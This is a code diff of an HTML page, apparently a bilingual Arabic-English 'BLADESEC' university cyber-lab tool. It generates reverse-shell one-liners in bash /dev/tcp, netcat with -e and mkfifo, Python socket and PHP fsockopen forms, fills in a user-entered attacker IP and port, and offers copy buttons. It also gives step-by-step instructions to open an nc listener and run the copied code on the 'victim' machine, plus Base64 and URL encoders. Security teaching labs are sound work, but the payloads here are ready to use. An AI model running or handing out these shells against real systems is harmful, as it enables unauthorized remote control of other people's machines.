@@ -1,134 +1,247 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="ar" dir="ltr">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>cyber - Payload Generator</title>
-    <!-- استدعاء Tailwind CSS للتصميم -->
+    <title>cyber - University Cyber Lab</title>
+    <!-- Tailwind CSS -->
     <script src="https://cdn.tailwindcss.com"></script>
-    <!-- استدعاء خطوط المبرمجين -->
-    <link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;600&display=swap" rel="stylesheet">
-    <!-- استدعاء الأيقونات -->
+    <!-- Google Fonts -->
+    <link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;600&family=Tajawal:wght@400;700&display=swap" rel="stylesheet">
+    <!-- FontAwesome -->
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     
     <script>
-        // إعدادات الألوان
         tailwind.config = {
             theme: {
                 extend: {
-                    fontFamily: { mono: ['"Fira Code"', 'monospace'] },
-                    colors: { panel: '#0a0a0a', primary: '#ef4444' }
+                    fontFamily: { 
+                        mono: ['"Fira Code"', 'monospace'],
+                        arabic: ['"Tajawal"', 'sans-serif']
+                    },
+                    colors: { panel: '#0a0a0a', primary: '#00ffc8' }
                 }
             }
         }
     </script>
     <style>
         body { background-color: #030712; color: #e5e7eb; }
-        .hacker-font { font-family: 'Fira Code', monospace; }
-        /* إخفاء شريط التمرير لجمالية الموقع */
         ::-webkit-scrollbar { height: 6px; width: 6px; }
-        ::-webkit-scrollbar-thumb { background: #ef444440; border-radius: 10px; }
+        ::-webkit-scrollbar-thumb { background: #00ffc840; border-radius: 10px; }
+        .tab-active { border-bottom: 2px solid #00ffc8; color: #00ffc8; }
+        .tab-inactive { color: #6b7280; }
+        .tab-inactive:hover { color: #d1d5db; }
     </style>
 </head>
-<body class="min-h-screen">
+<body class="min-h-screen font-mono">
 
-    <!-- الشريط العلوي -->
-    <nav class="border-b border-red-900/30 bg-black p-4 flex justify-between items-center sticky top-0 z-50">
+    <!-- Navbar -->
+    <nav class="border-b border-primary/20 bg-black p-4 flex justify-between items-center sticky top-0 z-50">
         <div class="flex items-center gap-3">
-            <i class="fa-solid fa-shield-halved text-primary text-2xl"></i>
-            <h1 class="font-bold text-xl tracking-widest text-primary hacker-font">BLADE<span class="text-white">SEC</span></h1>
+            <i class="fa-solid fa-graduation-cap text-primary text-2xl"></i>
+            <h1 class="font-bold text-xl tracking-widest text-primary">BLADE<span class="text-white">SEC</span> <span class="text-xs text-gray-500">LAB</span></h1>
         </div>
-        <div class="text-xs hacker-font text-gray-500 flex items-center gap-2">
+        <div class="text-xs text-gray-500 flex items-center gap-2">
             <span class="w-2 h-2 rounded-full bg-primary animate-pulse"></span>
-            UOH Cyber Lab
+            Educational Edition
         </div>
     </nav>
 
-    <!-- المحتوى الرئيسي -->
-    <main class="max-w-6xl mx-auto p-6 grid grid-cols-1 lg:grid-cols-12 gap-8 mt-8">
+    <main class="max-w-6xl mx-auto p-6 mt-4 space-y-8">
         
-        <!-- القسم الأيسر: إعدادات الهدف -->
-        <div class="lg:col-span-4 space-y-6">
-            <div class="bg-panel border border-red-900/20 p-5 rounded-xl">
-                <h2 class="text-sm font-bold hacker-font text-red-400 mb-4"><i class="fa-solid fa-crosshairs"></i> TARGET CONFIG</h2>
-                <div class="space-y-4">
-                    <div>
-                        <label class="text-xs text-gray-500 hacker-font mb-1 block">LHOST (Your IP)</label>
-                        <input type="text" id="ip-input" value="10.10.10.10" oninput="updatePayloads()" class="w-full bg-black border border-red-900/30 rounded p-2 text-sm hacker-font text-white focus:outline-none focus:border-primary/50">
+        <!-- القسم التعليمي (كيفية الاستخدام) -->
+        <section class="bg-panel border border-primary/20 rounded-xl p-6 relative overflow-hidden">
+            <div class="absolute top-0 right-0 w-32 h-32 bg-primary/5 rounded-full blur-3xl"></div>
+            <h2 class="text-lg font-bold text-primary mb-4 border-b border-primary/20 pb-2 flex items-center gap-2">
+                <i class="fa-solid fa-book-open"></i> How to use this Lab Tool? (كيف تستخدم الأداة؟)
+            </h2>
+            
+            <div class="grid grid-cols-1 md:grid-cols-3 gap-6 font-arabic mt-4" dir="rtl">
+                <!-- الخطوة 1 -->
+                <div class="bg-black/50 p-4 rounded-lg border border-gray-800">
+                    <div class="text-primary font-mono text-xl mb-2">01. المستمع (Listener)</div>
+                    <p class="text-sm text-gray-400 mb-3 leading-relaxed">
+                        في جهازك (المهاجم)، يجب فتح منفذ لاستقبال الاتصال القادم من الضحية باستخدام أداة Netcat.
+                    </p>
+                    <code class="block bg-[#111] p-2 rounded text-xs text-green-400 font-mono" dir="ltr">nc -lvnp 4444</code>
+                </div>
+                <!-- الخطوة 2 -->
+                <div class="bg-black/50 p-4 rounded-lg border border-gray-800">
+                    <div class="text-primary font-mono text-xl mb-2">02. الحمولة (Payload)</div>
+                    <p class="text-sm text-gray-400 mb-3 leading-relaxed">
+                        أدخل الـ IP الخاص بك (الذي ستستقبل عليه الاتصال) ورقم المنفذ أدناه، ثم اختر الكود المناسب لنظام الضحية وقم بنسخه.
+                    </p>
+                    <div class="text-xs text-gray-500 flex items-center gap-2 mt-2" dir="ltr">
+                        <i class="fa-solid fa-arrow-right"></i> Target Config
                     </div>
-                    <div>
-                        <label class="text-xs text-gray-500 hacker-font mb-1 block">LPORT</label>
-                        <input type="text" id="port-input" value="4444" oninput="updatePayloads()" class="w-full bg-black border border-red-900/30 rounded p-2 text-sm hacker-font text-white focus:outline-none focus:border-primary/50">
+                </div>
+                <!-- الخطوة 3 -->
+                <div class="bg-black/50 p-4 rounded-lg border border-gray-800">
+                    <div class="text-primary font-mono text-xl mb-2">03. التنفيذ (Execution)</div>
+                    <p class="text-sm text-gray-400 mb-3 leading-relaxed">
+                        قم بتنفيذ الكود المنسوخ في جهاز الضحية (الـ VM في المختبر). بمجرد التشغيل، ستلاحظ استلامك للـ Shell في نافذة الـ Netcat لديك.
+                    </p>
+                    <div class="text-xs text-red-400 bg-red-400/10 p-1.5 rounded inline-block mt-1">
+                        * للاستخدام الأكاديمي فقط
                     </div>
                 </div>
             </div>
-            <div class="bg-red-500/5 border border-red-500/20 p-4 rounded-xl flex gap-3 items-start">
-                <i class="fa-solid fa-triangle-exclamation text-primary mt-1"></i>
-                <p class="text-xs text-red-200/70 leading-relaxed hacker-font">
-                    For educational and authorized Pentesting only.
-                </p>
-            </div>
+        </section>
+
+        <!-- التبويبات (Tabs) -->
+        <div class="flex gap-6 border-b border-gray-800 px-2">
+            <button onclick="switchTab('revshell')" id="btn-revshell" class="pb-3 text-sm font-bold tab-active transition-colors flex items-center gap-2">
+                <i class="fa-solid fa-terminal"></i> Reverse Shells
+            </button>
+            <button onclick="switchTab('encoding')" id="btn-encoding" class="pb-3 text-sm font-bold tab-inactive transition-colors flex items-center gap-2">
+                <i class="fa-solid fa-code"></i> Data Encoding
+            </button>
         </div>
 
-        <!-- القسم الأيمن: الأكواد المولدة -->
-        <div class="lg:col-span-8 space-y-4" id="payloads-container">
-            <!-- سيتم توليد الأكواد هنا بواسطة الجافاسكربت -->
-        </div>
+        <!-- قسم الـ Reverse Shell -->
+        <section id="tab-revshell" class="grid grid-cols-1 lg:grid-cols-12 gap-8">
+            <!-- إعدادات الهدف -->
+            <div class="lg:col-span-4 space-y-4">
+                <div class="bg-panel border border-primary/20 p-5 rounded-xl">
+                    <h2 class="text-sm font-bold text-primary mb-4 flex items-center gap-2">
+                        <i class="fa-solid fa-crosshairs"></i> TARGET CONFIG
+                    </h2>
+                    <div class="space-y-4">
+                        <div>
+                            <label class="text-xs text-gray-500 mb-1 block">LHOST (Your Attacker IP)</label>
+                            <input type="text" id="ip-input" value="127.0.0.1" oninput="updatePayloads()" class="w-full bg-black border border-gray-800 rounded p-2 text-sm text-white focus:outline-none focus:border-primary/50 transition-colors">
+                        </div>
+                        <div>
+                            <label class="text-xs text-gray-500 mb-1 block">LPORT (Listening Port)</label>
+                            <input type="text" id="port-input" value="4444" oninput="updatePayloads()" class="w-full bg-black border border-gray-800 rounded p-2 text-sm text-white focus:outline-none focus:border-primary/50 transition-colors">
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- الأكواد المولدة -->
+            <div class="lg:col-span-8 space-y-4" id="payloads-container">
+                <!-- Javascript will populate this -->
+            </div>
+        </section>
+
+        <!-- قسم أدوات التشفير (الجديد) -->
+        <section id="tab-encoding" class="hidden grid-cols-1 lg:grid-cols-2 gap-6">
+            <div class="bg-panel border border-gray-800 p-5 rounded-xl">
+                <h2 class="text-sm font-bold text-primary mb-4"><i class="fa-solid fa-lock"></i> Base64 Encoder/Decoder</h2>
+                <textarea id="b64-input" placeholder="Enter text here..." class="w-full bg-black border border-gray-800 rounded p-3 text-sm text-gray-300 focus:outline-none focus:border-primary/50 h-24 mb-3 resize-none"></textarea>
+                <div class="flex gap-2 mb-3">
+                    <button onclick="encodeB64()" class="flex-1 bg-primary/10 hover:bg-primary/20 text-primary border border-primary/30 rounded py-2 text-xs font-bold transition-colors">Encode Base64</button>
+                    <button onclick="decodeB64()" class="flex-1 bg-gray-800 hover:bg-gray-700 text-white rounded py-2 text-xs font-bold transition-colors">Decode Base64</button>
+                </div>
+                <textarea id="b64-output" readonly placeholder="Result..." class="w-full bg-[#111] border border-gray-800 rounded p-3 text-sm text-primary focus:outline-none h-24 resize-none"></textarea>
+            </div>
+
+            <div class="bg-panel border border-gray-800 p-5 rounded-xl">
+                <h2 class="text-sm font-bold text-primary mb-4"><i class="fa-solid fa-link"></i> URL Encoder/Decoder</h2>
+                <textarea id="url-input" placeholder="Enter URL or Payload here..." class="w-full bg-black border border-gray-800 rounded p-3 text-sm text-gray-300 focus:outline-none focus:border-primary/50 h-24 mb-3 resize-none"></textarea>
+                <div class="flex gap-2 mb-3">
+                    <button onclick="encodeUrl()" class="flex-1 bg-primary/10 hover:bg-primary/20 text-primary border border-primary/30 rounded py-2 text-xs font-bold transition-colors">URL Encode</button>
+                    <button onclick="decodeUrl()" class="flex-1 bg-gray-800 hover:bg-gray-700 text-white rounded py-2 text-xs font-bold transition-colors">URL Decode</button>
+                </div>
+                <textarea id="url-output" readonly placeholder="Result..." class="w-full bg-[#111] border border-gray-800 rounded p-3 text-sm text-primary focus:outline-none h-24 resize-none"></textarea>
+            </div>
+        </section>
 
     </main>
 
-    <!-- الجافاسكربت المسؤولة عن تحديث الأكواد -->
     <script>
+        /* --- بيانات الأكواد --- */
         const payloadsData = [
-            { id: "bash", name: "Bash Reverse Shell", desc: "Standard interactive bash reverse shell.", code: "bash -i >& /dev/tcp/{ip}/{port} 0>&1" },
-            { id: "python", name: "Python3 Reverse Shell", desc: "Python one-liner reverse shell.", code: "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'" },
-            { id: "nc", name: "Netcat OpenBSD", desc: "Netcat reverse shell without -e flag.", code: "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ip} {port} >/tmp/f" },
-            { id: "php", name: "PHP Pentest Shell", desc: "Simple PHP web shell.", code: "php -r '$sock=fsockopen(\"{ip}\",{port});exec(\"/bin/sh -i <&3 >&3 2>&3\");'" }
+            { id: "bash", name: "Bash (TCP)", desc: "Standard interactive bash reverse shell for Linux.", code: "bash -i >& /dev/tcp/{ip}/{port} 0>&1" },
+            { id: "nc", name: "Netcat (Traditional)", desc: "Requires a version of nc with the -e execution flag.", code: "nc -e /bin/sh {ip} {port}" },
+            { id: "nc_mkfifo", name: "Netcat (OpenBSD)", desc: "Works on systems where nc doesn't support the -e flag.", code: "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ip} {port} >/tmp/f" },
+            { id: "python", name: "Python 3", desc: "Python one-liner. Excellent for bypassing basic restrictions.", code: "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'" },
+            { id: "php", name: "PHP Web Shell", desc: "Simple PHP reverse shell, often used in file upload vulnerabilities.", code: "php -r '$sock=fsockopen(\"{ip}\",{port});exec(\"/bin/sh -i <&3 >&3 2>&3\");'" }
         ];
 
+        /* --- توليد وعرض الأكواد --- */
         function updatePayloads() {
-            const ip = document.getElementById('ip-input').value || '10.10.10.10';
+            const ip = document.getElementById('ip-input').value || '127.0.0.1';
             const port = document.getElementById('port-input').value || '4444';
             const container = document.getElementById('payloads-container');
             
-            container.innerHTML = ''; // مسح القديم
+            container.innerHTML = ''; 
 
             payloadsData.forEach(p => {
-                // استبدال الـ IP والـ Port داخل الكود
                 const finalCode = p.code.replace(/{ip}/g, ip).replace(/{port}/g, port);
                 
                 const card = `
-                <div class="bg-panel border border-gray-800/50 rounded-xl overflow-hidden hover:border-red-900/50 transition-colors">
-                    <div class="p-4 border-b border-gray-800/50 flex justify-between items-center">
+                <div class="bg-panel border border-gray-800/50 rounded-xl overflow-hidden hover:border-primary/30 transition-all duration-300">
+                    <div class="p-3 border-b border-gray-800/50 flex justify-between items-center bg-black/40">
                         <div>
                             <h3 class="font-bold text-gray-200 flex items-center gap-2 text-sm">
-                                <i class="fa-solid fa-terminal text-primary"></i> ${p.name}
+                                <i class="fa-solid fa-chevron-right text-primary text-xs"></i> ${p.name}
                             </h3>
-                            <p class="text-xs text-gray-500 mt-1">${p.desc}</p>
+                            <p class="text-[11px] text-gray-500 mt-0.5">${p.desc}</p>
                         </div>
-                    </div>
-                    <div class="bg-black p-4 relative group">
-                        <pre class="text-xs text-red-300 hacker-font overflow-x-auto pb-2" id="code-${p.id}">${finalCode}</pre>
-                        <button onclick="copyCode('${p.id}')" class="absolute right-3 top-3 p-2 bg-[#111] border border-gray-800 rounded hover:bg-gray-800 transition-colors text-gray-400" title="Copy">
-                            <i class="fa-solid fa-copy" id="icon-${p.id}"></i>
+                        <button onclick="copyCode('${p.id}')" class="p-2 bg-[#111] border border-gray-700 rounded hover:bg-gray-800 transition-colors text-gray-400 group" title="Copy">
+                            <i class="fa-solid fa-copy group-hover:text-white" id="icon-${p.id}"></i>
                         </button>
+                    </div>
+                    <div class="bg-black p-4 relative">
+                        <pre class="text-xs text-primary/90 font-mono overflow-x-auto pb-1" id="code-${p.id}">${finalCode}</pre>
                     </div>
                 </div>`;
                 container.innerHTML += card;
             });
         }
 
+        /* --- دالة النسخ --- */
         function copyCode(id) {
             const codeText = document.getElementById(`code-${id}`).innerText;
             navigator.clipboard.writeText(codeText);
             
-            // تغيير أيقونة النسخ كدليل على النجاح
             const icon = document.getElementById(`icon-${id}`);
             icon.className = "fa-solid fa-check text-green-500";
-            setTimeout(() => { icon.className = "fa-solid fa-copy"; }, 2000);
+            setTimeout(() => { icon.className = "fa-solid fa-copy group-hover:text-white"; }, 1500);
         }
 
-        // تشغيل الدالة أول مرة تفتح فيها الصفحة
+        /* --- نظام التبويبات (Tabs) --- */
+        function switchTab(tabId) {
+            // إخفاء الكل
+            document.getElementById('tab-revshell').classList.add('hidden');
+            document.getElementById('tab-encoding').classList.add('hidden');
+            document.getElementById('tab-encoding').classList.remove('grid');
+            
+            // إعادة ضبط ألوان الأزرار
+            document.getElementById('btn-revshell').className = "pb-3 text-sm font-bold tab-inactive transition-colors flex items-center gap-2";
+            document.getElementById('btn-encoding').className = "pb-3 text-sm font-bold tab-inactive transition-colors flex items-center gap-2";
+
+            // تفعيل المطلوب
+            if(tabId === 'revshell') {
+                document.getElementById('tab-revshell').classList.remove('hidden');
+                document.getElementById('btn-revshell').className = "pb-3 text-sm font-bold tab-active transition-colors flex items-center gap-2";
+            } else {
+                document.getElementById('tab-encoding').classList.remove('hidden');
+                document.getElementById('tab-encoding').classList.add('grid');
+                document.getElementById('btn-encoding').className = "pb-3 text-sm font-bold tab-active transition-colors flex items-center gap-2";
+            }
+        }
+
+        /* --- أدوات التشفير --- */
+        function encodeB64() {
+            try { document.getElementById('b64-output').value = btoa(document.getElementById('b64-input').value); } 
+            catch(e) { document.getElementById('b64-output').value = "Error: Invalid Input"; }
+        }
+        function decodeB64() {
+            try { document.getElementById('b64-output').value = atob(document.getElementById('b64-input').value); } 
+            catch(e) { document.getElementById('b64-output').value = "Error: Not a valid Base64 string"; }
+        }
+        function encodeUrl() {
+            document.getElementById('url-output').value = encodeURIComponent(document.getElementById('url-input').value);
+        }
+        function decodeUrl() {
+            try { document.getElementById('url-output').value = decodeURIComponent(document.getElementById('url-input').value); }
+            catch(e) { document.getElementById('url-output').value = "Error: Invalid URL encoding"; }
+        }
+
+        // تشغيل الأكواد الافتراضية
         updatePayloads();
     </script>
 </body>
